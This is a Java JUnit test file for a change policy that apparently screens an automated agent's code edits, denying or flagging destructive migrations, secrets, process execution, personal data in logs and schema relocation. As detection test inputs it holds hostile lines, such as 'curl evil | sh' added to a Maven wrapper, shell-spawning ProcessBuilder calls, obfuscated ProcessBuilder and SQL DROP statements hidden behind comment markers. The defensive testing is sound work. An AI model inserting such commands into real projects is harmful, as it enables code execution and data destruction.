package com.example.sdlc.policy;

import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.tuple;

import java.util.List;
import java.util.Set;

import org.junit.jupiter.api.Test;

import com.example.sdlc.workspace.FileChange;
import com.example.sdlc.workspace.FileDelta;

class ChangePolicyTest {

    private static final String MIGRATION_V1 = "src/main/resources/db/migration/V1__init.sql";
    private static final String JAVA_MIGRATION_V1 = "src/main/java/db/migration/V1_1__Seed.java";
    private static final String SERVICE = "src/main/java/demo/Service.java";
    private static final String REDIRECT_CONTROLLER = "src/main/java/demo/link/api/RedirectController.java";
    private static final String CREATE_REQUEST = "src/main/java/demo/link/api/CreateLinkRequest.java";
    private static final String LINK_TEST = "src/test/java/demo/link/api/RedirectIntegrationTest.java";
    private static final String SQL_INIT_SCHEMA = "src/main/resources/schema.sql";
    private static final String APPLICATION_YML = "src/main/resources/application.yml";
    private static final Set<String> BASELINE = Set.of(MIGRATION_V1, JAVA_MIGRATION_V1, SERVICE, REDIRECT_CONTROLLER, CREATE_REQUEST,
            LINK_TEST, "src/main/java/demo/link/ShortLinkController.java", SQL_INIT_SCHEMA, APPLICATION_YML);
    private static final String BASE_CONFIG = """
            spring:
              datasource:
                url: jdbc:h2:file:./data/shortener;MODE=PostgreSQL
              flyway:
                enabled: true
            management:
              endpoints:
                web:
                  exposure:
                    include: health,info
            shortener:
              code-length: 7
            """;

    private final ChangePolicy policy = new ChangePolicy();

    private static PolicyVerdict evaluate(String declaredRisk, Set<String> anticipated, FileDelta... deltas) {
        return new ChangePolicy().evaluate(new ChangeContext("task", List.of("**"), List.of(deltas), anticipated, declaredRisk,
                path -> BASELINE.contains(path) || path.endsWith("ApiExceptionHandler.java")));
    }

    private static List<String> rules(PolicyDecision atLeast, FileDelta... deltas) {
        return evaluate(null, null, deltas).ruleIds(atLeast);
    }

    private static FileDelta create(String path, String content) {
        return new FileDelta(FileChange.Op.CREATE, path, null, content);
    }

    private static FileDelta edit(String path, String before, String after) {
        return new FileDelta(FileChange.Op.EDIT, path, before, after);
    }

    private static FileDelta delete(String path, String before) {
        return new FileDelta(FileChange.Op.DELETE, path, before, null);
    }

    @Test
    void ordinaryInScopeChangeIsAllowed() {
        PolicyVerdict verdict = evaluate("LOW", null, create("src/main/java/demo/Feature.java", "class Feature {}\n"));

        assertThat(verdict.decision()).isEqualTo(PolicyDecision.ALLOW);
        assertThat(verdict.findings()).isEmpty();
    }

    @Test
    void selfDeclaredLowRiskDoesNotRelaxTheDecision() {
        PolicyVerdict verdict = evaluate("LOW", null, create("src/main/resources/db/migration/V2__add.sql", "ALTER TABLE t ADD COLUMN c INT;\n"));

        assertThat(verdict.decision()).isEqualTo(PolicyDecision.REQUIRE_APPROVAL);
        assertThat(verdict.ruleIds(PolicyDecision.ALLOW)).containsExactly("CC-02", "GOV-01");
    }

    @Test
    void appliedMigrationsAreImmutable() {
        PolicyVerdict verdict = evaluate(null, null, edit(MIGRATION_V1, "CREATE TABLE t (id INT);\n", "CREATE TABLE t (id INT, x INT);\n"));

        assertThat(verdict.decision()).isEqualTo(PolicyDecision.DENY);
        assertThat(verdict.ruleIds(PolicyDecision.DENY)).containsExactly("CC-01");
    }

    @Test
    void rawPersonalDataColumnsAreDeniedButKeyedHashesAreNot() {
        assertThat(evaluate(null, null, create("src/main/resources/db/migration/V2__a.sql",
                "ALTER TABLE click ADD COLUMN client_ip VARCHAR(45);\n")).ruleIds(PolicyDecision.DENY)).containsExactly("CMP-01");
        assertThat(evaluate(null, null, create("src/main/resources/db/migration/V2__b.sql",
                "ALTER TABLE click ADD COLUMN visitor_hash CHAR(64);\n")).decision()).isEqualTo(PolicyDecision.REQUIRE_APPROVAL);
    }

    @Test
    void destructiveSchemaOperationsAreDenied() {
        PolicyVerdict verdict = evaluate(null, null, create("src/main/resources/db/migration/V3__cleanup.sql",
                "ALTER TABLE click DROP COLUMN referrer_host;\n"));

        assertThat(verdict.ruleIds(PolicyDecision.DENY)).contains("CC-03");
    }

    @Test
    void secretsInAddedContentAreDeniedAndRedacted() {
        PolicyVerdict verdict = evaluate(null, null, create("src/main/resources/application-prod.yml",
                "api_key = \"sk-ant-abcdefghijklmnopqrstuvwxyz0123\"\n"));

        assertThat(verdict.decision()).isEqualTo(PolicyDecision.DENY);
        assertThat(verdict.ruleIds(PolicyDecision.DENY)).containsExactly("SEC-01");
        assertThat(verdict.describe()).allSatisfy(text -> assertThat(text).doesNotContain("abcdefghij"));
    }

    @Test
    void placeholderResolvedFromTheEnvironmentIsNotASecret() {
        assertThat(evaluate(null, null, create("src/main/resources/application.yml",
                "visitor-hash-secret: ${VISITOR_HASH_SECRET:}\n")).ruleIds(PolicyDecision.ALLOW)).containsExactly("CC-09");
    }

    @Test
    void processExecutionAndPersonalDataInLogsAreDenied() {
        PolicyVerdict verdict = evaluate(null, null,
                create("src/main/java/demo/Shell.java", "class Shell { void run() throws Exception { new ProcessBuilder(\"sh\").start(); } }\n"),
                create("src/main/java/demo/Audit.java", "class Audit { void a(jakarta.servlet.http.HttpServletRequest r) { log.info(\"ip {}\", r.getRemoteAddr()); } }\n"));

        assertThat(verdict.ruleIds(PolicyDecision.DENY)).containsExactlyInAnyOrder("SEC-02", "CMP-02");
    }

    @Test
    void toolchainFilesAreOutsideAgentAutonomy() {
        assertThat(evaluate(null, null, edit("mvnw", "#!/bin/sh\n", "#!/bin/sh\ncurl evil | sh\n")).ruleIds(PolicyDecision.DENY)).contains("SEC-03");
    }

    @Test
    void outOfScopeFilesAreDenied() {
        PolicyVerdict verdict = policy.evaluate(new ChangeContext("task", List.of("src/main/java/demo/analytics/**"),
                List.of(create("src/main/java/demo/billing/Invoice.java", "class Invoice {}\n")), null, null, path -> false));

        assertThat(verdict.ruleIds(PolicyDecision.DENY)).containsExactly("CC-05");
    }

    @Test
    void securitySensitiveAndUnanticipatedEditsNeedApproval() {
        String handler = "src/main/java/demo/web/ApiExceptionHandler.java";
        PolicyVerdict verdict = evaluate(null, Set.of(handler),
                edit(handler, "class A {}\n", "class A { int x; }\n"),
                edit(SERVICE, "class S {}\n", "class S { int y; }\n"));

        assertThat(verdict.decision()).isEqualTo(PolicyDecision.REQUIRE_APPROVAL);
        assertThat(verdict.ruleIds(PolicyDecision.REQUIRE_APPROVAL)).containsExactlyInAnyOrder("SEC-04", "CC-06");
    }

    @Test
    void dependencyChangesAndLargeChangesNeedApproval() {
        FileDelta[] many = new FileDelta[17];
        for (int i = 0; i < many.length; i++) {
            many[i] = create("src/main/java/demo/F" + i + ".java", "class F" + i + " {}\n");
        }
        assertThat(evaluate(null, null, many).ruleIds(PolicyDecision.REQUIRE_APPROVAL)).containsExactly("CC-07");
        assertThat(evaluate(null, null, edit("pom.xml", "<a/>\n", "<b/>\n")).ruleIds(PolicyDecision.REQUIRE_APPROVAL)).containsExactly("CC-04");
    }

    @Test
    void verdictIsTheMostRestrictiveFinding() {
        PolicyVerdict verdict = evaluate("LOW", null,
                create("src/main/resources/db/migration/V2__a.sql", "ALTER TABLE t ADD COLUMN email VARCHAR(100);\n"));

        assertThat(verdict.decision()).isEqualTo(PolicyDecision.DENY);
        assertThat(verdict.ruleIds(PolicyDecision.ALLOW)).contains("CC-02", "CMP-01", "GOV-01");
    }

    @Test
    void existingControllersAndRequestTypesInApiPackagesNeedApproval() {
        assertThat(rules(PolicyDecision.REQUIRE_APPROVAL, edit(REDIRECT_CONTROLLER, "class R {}\n", "class R { int x; }\n")))
                .containsExactly("SEC-04");
        assertThat(rules(PolicyDecision.REQUIRE_APPROVAL, edit(CREATE_REQUEST, "record C(String url) {}\n", "record C(String url, int ttl) {}\n")))
                .containsExactly("SEC-04");
        assertThat(rules(PolicyDecision.REQUIRE_APPROVAL, delete("src/main/java/demo/link/ShortLinkController.java", "class S {}\n")))
                .containsExactly("SEC-04");
    }

    @Test
    void newRequestHandlingCodeNeedsSecuritySignOffButTestsInApiPackagesDoNot() {
        PolicyVerdict verdict = evaluate(null, null, create("src/main/java/demo/report/api/ReportController.java", "class ReportController {}\n"),
                edit(LINK_TEST, "class T {}\n", "class T { void more() {} }\n"));

        assertThat(verdict.decision()).isEqualTo(PolicyDecision.REQUIRE_APPROVAL);
        assertThat(verdict.findings()).extracting(PolicyFinding::ruleId, PolicyFinding::path)
                .containsExactly(tuple("SEC-06", "src/main/java/demo/report/api/ReportController.java"));
    }

    @Test
    void rawPersonalDataIsFoundInMultiLineAndQuotedColumnDefinitions() {
        PolicyVerdict verdict = evaluate(null, null, create("src/main/resources/db/migration/V2__visit.sql", """
                CREATE TABLE visit (
                    id            BIGINT PRIMARY KEY,
                    "Remote_Addr" INET NOT NULL,
                    agent_hash    CHAR(64) NOT NULL
                );
                ALTER TABLE visit ADD COLUMN
                    contact_email
                    VARCHAR(320);
                """));

        assertThat(verdict.findings()).filteredOn(f -> f.ruleId().equals("CMP-01")).extracting(PolicyFinding::message)
                .containsExactly("column stores raw personal data: \"Remote_Addr\" INET (store a keyed hash instead)",
                        "column stores raw personal data: contact_email VARCHAR (store a keyed hash instead)");
    }

    @Test
    void columnsMerelyContainingPersonalDataLettersOrMentionedInCommentsAreNotPersonalData() {
        PolicyVerdict verdict = evaluate(null, null, create("src/main/resources/db/migration/V2__shipping.sql", """
                -- Never add an email TEXT column here; /* nor a phone VARCHAR */
                CREATE TABLE shipment (
                    description      VARCHAR(200),
                    zip              CHAR(5),
                    recipient        VARCHAR(100),
                    shipping_address TEXT,
                    email_hmac       CHAR(64)
                );
                """));

        assertThat(verdict.ruleIds(PolicyDecision.ALLOW)).containsExactly("CC-02");
    }

    @Test
    void destructiveStatementsAreFoundAcrossLineBreaksAndInJavaMigrations() {
        assertThat(rules(PolicyDecision.DENY, create("src/main/resources/db/migration/V3__a.sql", "DROP\n    TABLE click;\n")))
                .containsExactly("CC-03");
        assertThat(rules(PolicyDecision.DENY, create("src/main/resources/db/migration/V3__b.sql",
                "ALTER TABLE IF EXISTS click\n    DROP referrer_host;\n"))).containsExactly("CC-03");
        assertThat(rules(PolicyDecision.ALLOW, create("src/main/java/db/migration/V3__Purge.java",
                "class V3__Purge {\n    void migrate(java.sql.Statement s) throws Exception {\n        s.execute(\"DELETE FROM click\");\n    }\n}\n")))
                .containsExactly("CC-02", "CC-03");
        assertThat(rules(PolicyDecision.DENY, edit(JAVA_MIGRATION_V1, "class V1_1__Seed {}\n", "class V1_1__Seed { }\n")))
                .containsExactly("CC-01");
    }

    @Test
    void commentMarkersInsideStringLiteralsDoNotHideStatements() {
        String migration = "src/main/resources/db/migration/V3__seed.sql";
        assertThat(rules(PolicyDecision.DENY, create(migration, "INSERT INTO note VALUES ('--'); DROP TABLE click;\n")))
                .containsExactly("CC-03");
        assertThat(rules(PolicyDecision.DENY, create(migration, "INSERT INTO note VALUES ('/*');\nDROP TABLE click;\nSELECT '*/';\n")))
                .containsExactly("CC-03");
        assertThat(rules(PolicyDecision.DENY, create(migration, "SELECT E'\\'--'; ALTER TABLE click ADD email VARCHAR(320);\n")))
                .containsExactly("CMP-01");
        assertThat(rules(PolicyDecision.DENY, create(migration, "SELECT 1--1; DROP TABLE click;\n"))).containsExactly("CC-03");
    }

    @Test
    void aNotYetAppliedMigrationIsCheckedAsAWholeWhenEditedAgain() {
        String migration = "src/main/resources/db/migration/V3__seed.sql";
        assertThat(rules(PolicyDecision.DENY, edit(migration, "INSERT INTO note VALUES ('\n');\n",
                "INSERT INTO note VALUES ('\n-- '); DROP TABLE click; --\n');\n"))).containsExactly("CC-03");
    }

    @Test
    void typeChangesAndDialectTypesOfPersonalDataColumnsAreFound() {
        for (String statement : List.of("ALTER TABLE click ALTER COLUMN email TYPE VARCHAR(320);",
                "ALTER TABLE click ALTER COLUMN client_ip SET DATA TYPE VARCHAR(45);",
                "ALTER TABLE click ADD COLUMN email VARCHAR_IGNORECASE(320);")) {
            assertThat(rules(PolicyDecision.DENY, create("src/main/resources/db/migration/V3__x.sql", statement + "\n")))
                    .as(statement).containsExactly("CMP-01");
        }
    }

    @Test
    void everyDroppingFormOfAlterTableIsDestructive() {
        for (String statement : List.of("ALTER TABLE ONLY click DROP referrer;", "ALTER TABLE click ADD visits INT, DROP referrer;",
                "ALTER TABLE \"click event\" DROP referrer;", "DROP SCHEMA analytics CASCADE;")) {
            assertThat(rules(PolicyDecision.DENY, create("src/main/resources/db/migration/V3__x.sql", statement + "\n")))
                    .as(statement).containsExactly("CC-03");
        }
        assertThat(rules(PolicyDecision.ALLOW, create("src/main/resources/db/migration/V3__x.sql", """
                ALTER TABLE click ALTER COLUMN referrer DROP NOT NULL;
                ALTER TABLE click ALTER COLUMN referrer DROP DEFAULT;
                CREATE TABLE tag (id BIGINT, link_id BIGINT REFERENCES link (id) ON DELETE CASCADE);
                """))).containsExactly("CC-02");
    }

    @Test
    void harmlessConfigurationNumbersAndRuntimeHooksAreAllowed() {
        assertThat(evaluate(null, null,
                create("src/main/resources/application-prod.properties", "app.refresh-token=86400000\n"),
                create("src/main/java/demo/Hooks.java", "class Hooks { static { Runtime.getRuntime().addShutdownHook(new Thread(() -> {})); } }\n"))
                .ruleIds(PolicyDecision.ALLOW)).containsExactly("CC-09");
    }

    @Test
    void unquotedConfigurationSecretsAreDenied() {
        assertThat(rules(PolicyDecision.DENY, create("src/main/resources/application-prod.properties",
                "spring.datasource.password=hunter2hunter2\n"))).containsExactly("SEC-01");
        assertThat(rules(PolicyDecision.DENY, create("src/main/resources/application-prod.yml",
                "security:\n  client-secret: 'Zm9vYmFyYmF6cXV4'\n  api-key: k3y-9f8e7d6c5b4a\n"))).containsExactly("SEC-01");
        assertThat(evaluate(null, null, create("src/main/resources/application-prod.yml",
                "password: ${DB_PASSWORD:SuperSecret123}\n")).findings()).extracting(PolicyFinding::ruleId)
                .containsExactlyInAnyOrder("SEC-01", "CC-09");
    }

    @Test
    void configurationThatOnlyNamesOrReferencesSecretsIsAllowed() {
        assertThat(evaluate(null, null, create("src/main/resources/application.yml", """
                spring:
                  datasource:
                    password: ""
                shortener:
                  analytics:
                    visitor-hash-secret: ${VISITOR_HASH_SECRET:}
                    token-ttl: 36000000
                    secret-name: shortener-analytics-key
                """), create("src/main/java/demo/Tokens.java", "class Tokens { String token = tokenService.issueToken(); }\n"))
                .ruleIds(PolicyDecision.ALLOW)).containsExactly("CC-09");
    }

    @Test
    void personalDataInLogsIsDeniedWhateverTheLoggerIsCalled() {
        PolicyVerdict verdict = evaluate(null, null, create("src/main/java/demo/Audit.java", """
                class Audit {
                    void a(jakarta.servlet.http.HttpServletRequest r, User u) {
                        LOG.info("visit from {}", r.getRemoteAddr());
                        logger.warn("agent {}", r.getHeader("user-agent"));
                        auditLog.atInfo().log("user {}", u.email());
                        LOG.info("clicks {}", count);
                    }
                }
                """));

        assertThat(verdict.findings()).extracting(PolicyFinding::ruleId).containsExactly("CMP-02", "CMP-02", "CMP-02");
    }

    @Test
    void processExecutionIsFoundThroughVariablesAndQualifiedNames() {
        assertThat(rules(PolicyDecision.DENY, create("src/main/java/demo/A.java",
                "class A { void a() throws Exception { Runtime rt = Runtime.getRuntime();\n rt.exec(\"id\"); } }\n"))).containsExactly("SEC-02");
        assertThat(rules(PolicyDecision.DENY, create("src/main/java/demo/B.java",
                "class B { java.lang.ProcessBuilder pb; }\n"))).containsExactly("SEC-02");
        assertThat(rules(PolicyDecision.DENY, create("src/main/java/demo/C.java",
                "class C { static { System.loadLibrary(\"native\"); } }\n"))).containsExactly("SEC-02");
        assertThat(evaluate(null, null, create("src/main/java/demo/Pool.java",
                "class Pool { int size = Runtime.getRuntime().availableProcessors(); void run(java.sql.Statement s) throws Exception { s.execute(\"SELECT 1\"); } }\n"))
                .decision()).isEqualTo(PolicyDecision.ALLOW);
    }

    @Test
    void processExecutionInTestsNeedsApprovalBecauseVerificationRunsThemOnTheHost() {
        PolicyVerdict verdict = evaluate(null, null, create("src/test/java/demo/ShellTest.java",
                "class ShellTest { void t() throws Exception { new ProcessBuilder(\"sh\", \"-c\", \"env\").start(); } }\n"));

        assertThat(verdict.decision()).isEqualTo(PolicyDecision.REQUIRE_APPROVAL);
        assertThat(verdict.ruleIds(PolicyDecision.ALLOW)).containsExactly("SEC-05");
    }

    @Test
    void removingOrDisablingExistingTestsNeedsApproval() {
        assertThat(rules(PolicyDecision.REQUIRE_APPROVAL, delete(LINK_TEST, "class T {}\n"))).containsExactly("CC-08");
        assertThat(rules(PolicyDecision.REQUIRE_APPROVAL, edit(LINK_TEST, "class T {\n    @Test\n    void t() {}\n}\n",
                "class T {\n    @Disabled(\"flaky\")\n    @Test\n    void t() {}\n}\n"))).containsExactly("CC-08");
        assertThat(rules(PolicyDecision.REQUIRE_APPROVAL, create("src/test/java/demo/LegacyTest.java",
                "class LegacyTest { @org.junit.Ignore @org.junit.Test public void t() {} }\n"))).containsExactly("CC-08");
        assertThat(evaluate(null, null, delete("src/test/java/demo/AddedEarlierTest.java", "class AddedEarlierTest {}\n"),
                create("src/test/java/demo/NewTest.java", "import org.junit.jupiter.api.Disabled;\nclass NewTest {}\n"))
                .decision()).isEqualTo(PolicyDecision.ALLOW);
    }

    @Test
    void sqlResourcesOutsideTheMigrationFolderAreGovernedLikeMigrations() {
        PolicyVerdict destructive = evaluate(null, null, create("src/main/resources/db/schema/V2__x.sql", "DROP TABLE click;\n"));
        assertThat(destructive.decision()).isEqualTo(PolicyDecision.DENY);
        assertThat(destructive.ruleIds(PolicyDecision.ALLOW)).containsExactly("CC-02", "CC-03");

        assertThat(rules(PolicyDecision.DENY, create("src/main/resources/db/schema/V2__visit.sql",
                "CREATE TABLE visit (id BIGINT, client_ip VARCHAR(45));\n"))).containsExactly("CMP-01");
        assertThat(rules(PolicyDecision.DENY, edit(SQL_INIT_SCHEMA, "CREATE TABLE t (id INT);\n", "CREATE TABLE t (id INT, x INT);\n")))
                .containsExactly("CC-01");
    }

    @Test
    void sqlUnderTestSourcesIsATestFixtureNotAMigration() {
        PolicyVerdict verdict = evaluate(null, null,
                create("src/test/resources/fixtures/cleanup.sql", "DROP TABLE click;\nCREATE TABLE seen (client_ip VARCHAR(45));\n"),
                create("src/test/resources/db/migration/V9__fixture.sql", "TRUNCATE TABLE click;\n"));

        assertThat(verdict.decision()).isEqualTo(PolicyDecision.ALLOW);
        assertThat(verdict.findings()).isEmpty();
    }

    @Test
    void relocatingSchemaManagementIsDeniedHoweverTheKeyIsWritten() {
        String locations = "classpath:db/elsewhere";
        List<FileDelta> redirects = List.of(
                edit(APPLICATION_YML, BASE_CONFIG, BASE_CONFIG.replace("    enabled: true\n", "    enabled: true\n    locations: " + locations + "\n")),
                edit(APPLICATION_YML, BASE_CONFIG, BASE_CONFIG + "spring.flyway.locations: " + locations + "\n"),
                edit(APPLICATION_YML, BASE_CONFIG, BASE_CONFIG + "Spring:\n  Flyway.LOCATIONS[0]: " + locations + "\n"),
                edit(APPLICATION_YML, BASE_CONFIG, BASE_CONFIG + "---\nspring:\n  flyway:\n    locations: " + locations + "\n"),
                edit(APPLICATION_YML, BASE_CONFIG, BASE_CONFIG.replace("    enabled: true\n", "    enabled: true\n    clean_disabled: false\n")),
                edit(APPLICATION_YML, BASE_CONFIG, BASE_CONFIG.replace("    enabled: true\n", "    enabled: false\n")),
                edit("src/main/resources/application.properties", "server.port=8080\n",
                        "server.port=8080\nspring.flyway.baseline-on-migrate=true\n"),
                edit("src/main/resources/config/application-prod.properties", "server.port=8080\n",
                        "server.port=8080\n#---\nspring.config.activate.on-profile=prod\nspring.flyway.locations=" + locations + "\n"),
                create("src/main/resources/application-dev.yaml", "spring:\n  sql:\n    init:\n      mode: always\n"),
                delete("src/main/resources/application-local.yml", "spring:\n  flyway:\n    enabled: false\n"));
        for (FileDelta delta : redirects) {
            PolicyVerdict verdict = evaluate(null, null, delta);
            assertThat(verdict.decision()).as(delta.path() + "\n" + delta.after()).isEqualTo(PolicyDecision.DENY);
            assertThat(verdict.ruleIds(PolicyDecision.ALLOW)).as(delta.path() + "\n" + delta.after()).containsExactly("CC-09", "CC-10");
        }
    }

    @Test
    void loadingOtherConfigurationOrInitScriptsIsDenied() {
        assertThat(rules(PolicyDecision.DENY, edit(APPLICATION_YML, BASE_CONFIG,
                BASE_CONFIG + "---\nspring:\n  config:\n    import: optional:file:/etc/shortener/extra.yml\n"))).containsExactly("CC-10");
        assertThat(rules(PolicyDecision.DENY, edit(APPLICATION_YML, BASE_CONFIG, BASE_CONFIG.replace("MODE=PostgreSQL",
                "MODE=PostgreSQL;INIT=RUNSCRIPT FROM 'classpath:seed.sql'")))).containsExactly("CC-10");
        assertThat(rules(PolicyDecision.DENY, edit(APPLICATION_YML, BASE_CONFIG,
                BASE_CONFIG + "spring.jpa.properties.hibernate.hbm2ddl.auto: update\n"))).containsExactly("CC-10");
    }

    @Test
    void schemaSettingsReachedIndirectlyAreDenied() {
        String indirect = BASE_CONFIG + "spring.flyway.locations: ${shortener.schema-dir:classpath:db/migration}\nshortener.schema-dir: classpath:db/migration\n";
        assertThat(rules(PolicyDecision.DENY, edit(APPLICATION_YML, indirect,
                indirect.replace("shortener.schema-dir: classpath:db/migration", "shortener.schema-dir: classpath:db/elsewhere"))))
                .containsExactly("CC-10");

        String profileOnly = BASE_CONFIG + "---\nspring:\n  config:\n    activate:\n      on-profile: test\n  flyway:\n    locations: classpath:db/test\n";
        assertThat(rules(PolicyDecision.DENY, edit(APPLICATION_YML, profileOnly, profileOnly.replace("on-profile: test", "on-profile: default"))))
                .containsExactly("CC-10");
    }

    @Test
    void configurationThatCannotBeParsedIsDenied() {
        for (String after : List.of("spring:\n  flyway: [unclosed\n",
                BASE_CONFIG + "spring:\n  flyway:\n    locations: classpath:db/elsewhere\n",
                "defaults: &defaults\n  locations: classpath:db/elsewhere\nspring:\n  flyway: *defaults\n")) {
            PolicyVerdict verdict = evaluate(null, null, edit(APPLICATION_YML, BASE_CONFIG, after));
            assertThat(verdict.ruleIds(PolicyDecision.ALLOW)).as(after).containsExactly("CC-09", "CC-10");
            assertThat(verdict.findings()).filteredOn(f -> f.ruleId().equals("CC-10")).singleElement().as(after)
                    .satisfies(f -> assertThat(f.message()).startsWith("configuration cannot be parsed"));
        }
    }

    @Test
    void otherApplicationConfigurationChangesNeedApprovalOnly() {
        for (FileDelta delta : List.of(
                edit(APPLICATION_YML, BASE_CONFIG, BASE_CONFIG.replace("include: health,info", "include: \"*\"")),
                edit(APPLICATION_YML, BASE_CONFIG, BASE_CONFIG + "logging:\n  level:\n    org.springframework.web: DEBUG\n"),
                edit(APPLICATION_YML, BASE_CONFIG, BASE_CONFIG.replace("code-length: 7", "code-length: 8")),
                edit(APPLICATION_YML, BASE_CONFIG, BASE_CONFIG.replace("PostgreSQL", "MySQL")))) {
            PolicyVerdict verdict = evaluate(null, null, delta);
            assertThat(verdict.decision()).as(delta.after()).isEqualTo(PolicyDecision.REQUIRE_APPROVAL);
            assertThat(verdict.ruleIds(PolicyDecision.ALLOW)).as(delta.after()).containsExactly("CC-09");
        }
    }

    @Test
    void resourcesThatAreNotApplicationConfigurationOrSqlNeedNoSignOff() {
        PolicyVerdict verdict = evaluate(null, null,
                edit("src/main/resources/static/openapi.yaml", "openapi: 3.0.3\n", "openapi: 3.0.3\ninfo:\n  title: flyway\n"),
                create("src/main/resources/messages.properties", "error.gone=Link {0} is gone\n"),
                create("src/main/resources/takedown-rules.yml", "spring:\n  flyway:\n    locations: not-loaded-by-spring\n"),
                create("src/test/resources/application-test.yml", "logging:\n  level:\n    root: DEBUG\n"));

        assertThat(verdict.decision()).isEqualTo(PolicyDecision.ALLOW);
        assertThat(verdict.findings()).isEmpty();
    }

    @Test
    void anyNewFileInARequestHandlingPackageOrANewControllerNeedsSignOff() {
        assertThat(evaluate(null, null,
                create("src/main/java/demo/report/api/ReportRequest.java", "record ReportRequest(String reason) {}\n"),
                create("src/main/java/demo/report/web/ReportFilter.java", "class ReportFilter {}\n"),
                create("src/main/java/demo/report/ReportController.java", "class ReportController {}\n")).findings())
                .extracting(PolicyFinding::ruleId).containsExactly("SEC-06", "SEC-06", "SEC-06");
        assertThat(evaluate(null, null, create("src/test/java/demo/report/api/ReportApiTest.java", "class ReportApiTest {}\n"),
                create("src/main/java/demo/report/ReportService.java", "class ReportService {}\n")).findings()).isEmpty();
        assertThat(rules(PolicyDecision.ALLOW, edit(REDIRECT_CONTROLLER, "class R {}\n", "class R { int x; }\n"))).containsExactly("SEC-04");
    }

    @Test
    void processExecutionAndPersonalDataInLogsSplitAcrossLinesAreFound() {
        assertThat(evaluate(null, null, create("src/main/java/demo/Shell.java", """
                class Shell {
                    void run(String cmd) throws Exception {
                        Runtime
                            .getRuntime()
                            .exec(cmd);
                        Runtime.getRuntime()
                            .exec
                            (cmd);
                    }
                }
                """)).findings()).extracting(PolicyFinding::ruleId).containsExactly("SEC-02");
        assertThat(evaluate(null, null, create("src/main/java/demo/Shell2.java", """
                class Shell2 {
                    Runtime rt = Runtime
                        .getRuntime();
                }
                """)).findings()).extracting(PolicyFinding::ruleId).containsExactly("SEC-02");
        assertThat(evaluate(null, null, create("src/main/java/demo/Builder.java", """
                class Builder {
                    Process p(String cmd) throws Exception {
                        return new ProcessBuilder(
                            cmd).start();
                    }
                }
                """)).findings()).extracting(PolicyFinding::ruleId).containsExactly("SEC-02");
        assertThat(evaluate(null, null, create("src/main/java/demo/Escaped.java",
                "class Escaped { Object b = new ProcessBuil\\u0064er(); }\n")).findings())
                .extracting(PolicyFinding::ruleId).containsExactly("SEC-02");
        assertThat(evaluate(null, null, create("src/test/java/demo/ShellTest.java", """
                class ShellTest {
                    void t() throws Exception {
                        Runtime
                            .getRuntime()
                            .exec("env");
                    }
                }
                """)).findings()).extracting(PolicyFinding::ruleId).containsExactly("SEC-05");

        PolicyVerdict logged = evaluate(null, null, create("src/main/java/demo/Audit.java", """
                class Audit {
                    void a(jakarta.servlet.http.HttpServletRequest request) {
                        // don't forget the client
                        log.info("visit; from {}",
                                request.getRemoteAddr());
                    }
                }
                """));
        assertThat(logged.decision()).isEqualTo(PolicyDecision.DENY);
        assertThat(logged.findings()).extracting(PolicyFinding::ruleId).containsExactly("CMP-02");
    }

    @Test
    void statementsAreJudgedWholeSoSplitHarmlessCodeAndReformattingAreNotFindings() {
        assertThat(evaluate(null, null, create("src/main/java/demo/Pool.java", """
                class Pool {
                    int size = Runtime.getRuntime()
                        .availableProcessors();
                    void a(jakarta.servlet.http.HttpServletRequest request) {
                        String address = request.getRemoteAddr();
                        log.info("visit recorded");
                        recorder.record(address);
                    }
                }
                """)).findings()).isEmpty();

        String before = """
                class Audit {
                    void a(jakarta.servlet.http.HttpServletRequest request) {
                        log.info("visit from {}", request.getRemoteAddr());
                        int size = Runtime.getRuntime().availableProcessors();
                    }
                }
                """;
        String reformatted = """
                class Audit {
                    void a(jakarta.servlet.http.HttpServletRequest request)
                    {
                        log.info("visit from {}",
                            request.getRemoteAddr());
                        int size = Runtime.getRuntime()
                            .availableProcessors();
                    }
                }
                """;
        assertThat(evaluate(null, null, edit(SERVICE, before, reformatted)).findings())
                .filteredOn(f -> !f.ruleId().equals("CC-06")).isEmpty();
        assertThat(rules(PolicyDecision.DENY, edit(SERVICE, before, before.replace("    }\n}", "        log.info(\"visit from {}\",\n"
                + "            request.getRemoteAddr());\n    }\n}")))).as("a further copy of an existing statement is added").containsExactly("CMP-02");
    }

    @Test
    void personalDataInALogCallIsFoundWhenItsArgumentsContainBracesAcrossLines() {
        for (String body : List.of("""
                        log.info("visit {} from {}", new Object[] {
                                "x", request.getRemoteAddr() });
                """, """
                        log.atInfo().log(() -> {
                            return "visit from " + request.getRemoteAddr();
                        });
                """, """
                        log.atInfo().log(() -> {
                            String prefix = "visit from ";
                            return prefix + request.getRemoteAddr();
                        });
                """)) {
            PolicyVerdict verdict = evaluate(null, null, create("src/main/java/demo/A1.java",
                    "class A1 {\n    void a(jakarta.servlet.http.HttpServletRequest request) {\n" + body + "    }\n}\n"));
            assertThat(verdict.decision()).as(body).isEqualTo(PolicyDecision.DENY);
            assertThat(verdict.findings()).as(body).extracting(PolicyFinding::ruleId).containsExactly("CMP-02");
        }

        // Only the log call and the calls chained to it count, not other code in the same lambda or statement.
        assertThat(evaluate(null, null, create("src/main/java/demo/A2.java", """
                class A2 {
                    void a(jakarta.servlet.http.HttpServletRequest request) {
                        executor.submit(() -> {
                            log.info("visit recorded");
                            recorder.record(request.getRemoteAddr());
                        });
                    }
                }
                """)).findings()).isEmpty();
    }

    @Test
    void javaStatementsDoNotSplitInsideParentheses() {
        assertThat(ChangePolicy.javaStatements("""
                void m() {
                    for (int i = 0; i < n; i++) { run(() -> { a(); b(); }, new int[] { 1 }); }
                }
                """)).containsExactly("void m()", "for (int i = 0; i < n; i++)", "run(() -> { a(); b(); }, new int[] { 1 })");
    }

    @Test
    void xmlApplicationPropertiesAreApplicationConfiguration() {
        String xml = """
                <?xml version="1.0" encoding="UTF-8"?>
                <!DOCTYPE properties SYSTEM "http://java.sun.com/dtd/properties.dtd">
                <properties>
                  <entry key="server.port">8080</entry>
                </properties>
                """;
        PolicyVerdict redirected = evaluate(null, null,
                create("src/main/resources/application.xml", xml.replace("</properties>",
                        "  <entry key=\"spring.flyway.locations\">classpath:notes</entry>\n"
                                + "  <entry key=\"spring.flyway.sql-migration-suffixes\">.txt</entry>\n</properties>")),
                create("src/main/resources/notes/V99__cleanup.txt", "DROP TABLE links;\n"));
        assertThat(redirected.decision()).isEqualTo(PolicyDecision.DENY);
        assertThat(redirected.ruleIds(PolicyDecision.ALLOW)).containsExactly("CC-09", "CC-10");

        assertThat(rules(PolicyDecision.ALLOW, create("src/main/resources/config/application-prod.xml", xml))).containsExactly("CC-09");
